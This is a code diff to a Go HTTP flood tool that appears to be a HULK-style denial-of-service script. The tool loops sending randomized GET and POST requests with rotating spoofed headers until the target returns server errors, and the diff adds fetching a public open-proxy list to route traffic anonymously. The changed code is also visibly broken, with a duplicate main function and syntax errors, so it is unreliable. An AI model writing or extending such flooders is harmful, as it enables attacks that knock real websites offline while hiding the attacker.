@@ -9196,67 +9196,132 @@ func main() {
 	<-ctlc
 	fmt.Println("\r\n-- Interrupted by user --        \n")
 }
+func loadProxyURLsFromURL(url string) ([]string, error) {
+	// Thực hiện yêu cầu HTTP đến URL
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
 
-func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
-	atomic.AddInt32(&cur, 1)
-
-	var param_joiner string
-	var client = new(http.Client)
-
-	if strings.ContainsRune(url, '?') {
-		param_joiner = "&"
-	} else {
-		param_joiner = "?"
+	// Đọc nội dung từ phản hồi HTTP
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
 	}
 
-	for {
-		var q *http.Request
-		var err error
+	// Chia danh sách proxy từ nội dung
+	urls := strings.Split(string(body), "\n")
 
-		if data == "" {
-			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
-		} else {
-			q, err = http.NewRequest("POST", url, strings.NewReader(data))
-		}
-
-		if err != nil {
-			s <- callExitOnErr
-			return
-		}
-
-		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
-		q.Header.Set("Cache-Control", "no-cache")
-		q.Header.Set("Accept-Charset", acceptCharset)
-		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
-		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
-		q.Header.Set("Connection", "keep-alive")
-		q.Header.Set("Host", host)
-
-		// Overwrite headers with parameters
-
-		for _, element := range headers {
-			words := strings.Split(element, ":")
-			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
-		}
-
-		r, e := client.Do(q)
-		if e != nil {
-			fmt.Fprintln(os.Stderr, e.Error())
-			if strings.Contains(e.Error(), "socket: too many open files") {
-				s <- callExitOnTooManyFiles
-				return
-			}
-			s <- callExitOnErr
-			return
-		}
-		r.Body.Close()
-		s <- callGotOk
-		if safe {
-			if r.StatusCode >= 500 {
-				s <- targetComplete
-			}
+	// Loại bỏ các khoảng trắng và dòng trống
+	var cleanedURLs []string
+	for _, url := range urls {
+		url = strings.TrimSpace(url)
+		if url != "" {
+			cleanedURLs = append(cleanedURLs, url)
 		}
 	}
+
+	return cleanedURLs, nil
+}
+
+func main() {
+	// URL chứa danh sách proxy
+	proxyURL := "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+
+	// Tải danh sách URL proxy từ URL
+	proxyURLs, err := loadProxyURLsFromURL(proxyURL)
+	if err != nil {
+		fmt.Println("Lỗi khi tải danh sách URL proxy từ URL:", err)
+		return
+	}
+
+	// In danh sách URL proxy
+	fmt.Println("Danh sách URL proxy:")
+	for _, url := range proxyURLs {
+		fmt.Println(url)
+	}
+
+	// Sử dụng danh sách URL proxy trong mã của bạn, ví dụ:
+	// httpcall(url, host, data, headers, s, proxyURLs)
+}
+
+func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8, proxyURLs []string) {
+    atomic.AddInt32(&cur, 1)
+
+    var param_joiner string
+    var client = &http.Client{}
+
+    if strings.ContainsRune(url, '?') {
+        param_joiner = "&"
+    } else {
+        param_joiner = "?"
+    }
+
+    // Sử dụng proxy từ danh sách proxyURLs
+    proxyIndex := rand.Intn(len(proxyURLs))
+    proxyAddress := proxyURLs[proxyIndex]
+
+    // Tạo đối tượng proxy
+    proxy, err := url.Parse(proxyAddress)
+    if err != nil {
+        fmt.Fprintln(os.Stderr, "Lỗi khi xử lý proxy:", err)
+        s <- callExitOnErr
+        return
+    }
+
+    // Tạo đối tượng Transport cho client HTTP để sử dụng proxy
+    client.Transport = &http.Transport{
+        Proxy: http.ProxyURL(proxy),
+    }
+
+    for {
+        var q *http.Request
+        var err error
+
+        if data == "" {
+            q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+        } else {
+            q, err = http.NewRequest("POST", url, strings.NewReader(data))
+        }
+
+        if err != nil {
+            s <- callExitOnErr
+            return
+        }
+
+        q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))]
+        q.Header.Set("Cache-Control", "no-cache")
+        q.Header.Set("Accept-Charset", acceptCharset)
+        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Int(n(5)+5))
+        q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+        q.Header.Set("Connection", "keep-alive")
+        q.Header.Set("Host", host)
+
+        // Overwrite headers with parameters
+        for _, element := range headers {
+            words := strings.Split(element, ":")
+            q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
+        }
+
+        r, e := client.Do(q)
+        if e != nil {
+            fmt.Fprintln(os.Stderr, e.Error())
+            if strings.Contains(e.Error(), "socket: too many open files") {
+                s <- callExitOnTooManyFiles
+                return
+            }
+            s <- callExitOnErr
+            return
+        }
+        r.Body.Close()
+        s <- callGotOk
+        if safe {
+            if r.StatusCode >= 500 {
+                s <- targetComplete
+            }
+        }
+    }
 }
 
 func buildblock(size int) (s string) {
